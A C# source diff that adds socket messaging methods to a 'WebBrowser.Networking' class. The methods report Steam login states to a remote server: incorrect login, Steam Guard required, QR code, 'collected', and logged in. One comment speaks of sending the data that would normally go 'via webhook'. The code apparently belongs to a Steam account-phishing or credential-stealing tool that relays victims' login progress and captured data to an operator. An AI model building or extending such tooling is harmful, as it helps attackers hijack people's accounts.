@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO.Ports;
 using System.Linq;
 using System.Net.Sockets;
 using System.Text;
@@ -130,6 +131,90 @@ namespace WebBrowser.Networking
             string json = JsonSerializer.Serialize(obj);
             byte[] data = Encoding.UTF8.GetBytes(json);
             await stream.WriteAsync(data, 0, data.Length);
+        }
+
+        public async Task SendNotification(object dataToSend)
+        {
+            await SendJsonAsync(dataToSend);
+        }
+
+        public async Task SendNotLoggedIn()
+        {
+            var data = new
+            {
+                command = "notLoggedIn",
+                clientId = clientID,
+            };
+
+            await SendJsonAsync(data);
+        }
+
+        public async Task SendQrCode(string qr)
+        {
+            var data = new
+            {
+                command = "qrCode",
+                clientId = clientID,
+                qrcode = qr,
+            };
+
+            await SendJsonAsync(data);
+        }
+
+        public async Task SendRequireSteamGuard()
+        {
+            var data = new
+            {
+                command = "requireSteamGuard",
+                clientId = clientID,
+            };
+
+            await SendJsonAsync(data);
+        }
+
+        public async Task SendIncorrectSteamLogin()
+        {
+            var data = new
+            {
+                command = "incorrectSteamLogin",
+                clientId = clientID,
+            };
+
+            await SendJsonAsync(data);
+        }
+
+        public async Task SendIncorrectSteamGuard()
+        {
+            var data = new
+            {
+                command = "incorrectSteamGuard",
+                clientId = clientID,
+            };
+
+            await SendJsonAsync(data);
+        }
+
+        public async Task SendCollected()
+        {
+            var data = new
+            {
+                command = "collected",
+                clientId = clientID,
+                // SEND ALL THE EMBED DATA THAT WE WOULD NORMALLY SEND VIA WEBHOOK
+            };
+
+            await SendJsonAsync(data);
+        }
+
+        public async Task SendLoggedIn()
+        {
+            var data = new
+            {
+                command = "loggedIn",
+                clientId = clientID,
+            };
+
+            await SendJsonAsync(data);
         }
     }
 }
